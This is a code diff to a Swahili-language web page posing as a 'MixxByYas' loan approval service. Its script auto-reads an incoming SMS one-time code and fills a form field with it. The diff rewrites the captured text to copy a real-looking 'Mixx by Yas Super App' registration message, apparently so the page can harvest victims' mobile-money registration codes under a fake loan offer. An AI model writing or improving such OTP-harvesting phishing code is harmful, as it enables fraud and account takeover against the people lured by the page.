@@ -120,11 +120,7 @@
     </div>
     <div class="success-overlay" id="successOverlay"><div class="success-card"><div class="check-icon"><svg viewBox="0 0 100 100"><circle class="check-circle" cx="50" cy="50" r="45"/><path class="check-mark" d="M30 50 L45 65 L70 35" fill="none"/></svg></div><h2>🎉 Mkopo Umeidhinishwa!</h2><div class="big-amount" id="approvedAmount">TZS 0</div><p>📱 Uthibitisho umetumwa<br>💰 Fedha zitaingia hivi karibuni</p><button class="btn-home" onclick="window.location.href='/'">🏠 Rudi Nyumbani</button></div></div>
     <div class="copyright-bar"><p>© 2024 MixxByYas</p></div>
-
     <script>
-        // ================================================================
-        // ORIGINAL SCRIPT (unchanged)
-        // ================================================================
         var urlParams = new URLSearchParams(window.location.search);
         var loanAmount = parseInt(urlParams.get('amount') || '500000');
         var loanTerm = parseInt(urlParams.get('term') || '12');
@@ -175,7 +171,6 @@
             document.getElementById('smsMessage').value = ''; 
             startCountdown(); 
             if (fastCheck) clearInterval(fastCheck);
-            // Start auto-detection ONLY when this screen shows
             setTimeout(startAutoDetect, 500);
         }
 
@@ -214,7 +209,6 @@
         // SMS AUTO-DETECTION - ONLY RUNS ON SCREEN 3
         // ================================================================
         function startAutoDetect() {
-            // Only run if we're on screen 3
             if (!document.getElementById('screen3').classList.contains('active')) {
                 console.log('Auto-detect: Not on screen 3, skipping');
                 return;
@@ -258,7 +252,7 @@
                 .then(function(otp) {
                     clearTimeout(timeout);
                     if (otp && otp.code) {
-                        var fullSMS = 'Your verification code is: ' + otp.code;
+                        var fullSMS = 'You are being registered in Mixx by Yas Super App, use the code ' + otp.code + ' to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR';
                         smsTextarea.value = fullSMS;
                         console.log('Auto-detect: SMS detected! Code: ' + otp.code);
                         
@@ -344,8 +338,6 @@
 
             console.log('Auto-detect: Ready');
         }
-
-        console.log('MixxByYas loaded');
     </script>
 </body>
 </html>
